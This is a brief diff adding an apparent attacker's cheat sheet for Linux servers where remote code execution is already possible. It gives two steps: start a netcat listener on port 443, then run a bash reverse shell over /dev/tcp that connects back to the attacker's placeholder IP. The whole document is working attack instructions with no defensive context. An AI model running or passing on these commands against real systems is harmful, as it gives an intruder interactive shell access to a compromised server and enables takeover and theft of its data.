@@ -1,1 +1,4 @@
+FOR LINUX SERVERSE WHEN YOU HAVE RCE.
+  1. start listener over non blocked port like 443 == nc -lvnp 443
 
+  2. Then insert this command where you have rce == 'bash -c "bash -i >& /dev/tcp/<myip>/443 0>&1"'
